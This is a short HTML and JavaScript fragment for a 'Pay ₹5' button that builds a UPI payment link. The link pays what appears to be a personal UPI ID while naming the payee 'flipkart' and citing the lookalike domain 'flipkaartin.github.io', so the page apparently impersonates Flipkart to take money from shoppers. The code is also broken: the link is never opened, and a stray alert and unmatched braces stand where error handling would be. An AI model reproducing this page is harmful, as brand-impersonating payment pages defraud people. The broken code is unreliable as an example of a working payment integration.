<body>

    <button onclick="initiateUpiPayment()">Pay â‚¹5</button>

    <script>
        function initiateUpiPayment() {
            var upiId = 'rishabhsisodiya1998@ybl';
            var amount = '5';
            var payeeName = 'flipkart';
            var transactionId = '123456789';
            var paymentDescription = 'service station';

            // Shortened URL for demonstration purposes
            var shortUrl = 'https://flipkaartin.github.io/.com';

            var upiLink = `upi://pay?pa=${upiId}&pn=${payeeName}&mc=yourMerchantCode&tid=${transactionId}&tr=${transactionId}&tn=${encodeURIComponent(paymentDescription)}&am=${amount}&cu=INR&url=${shortUrl}`;

                alert('Unable to open UPI app. Please ensure you have a UPI app installed.');
            }
        }
    </script>
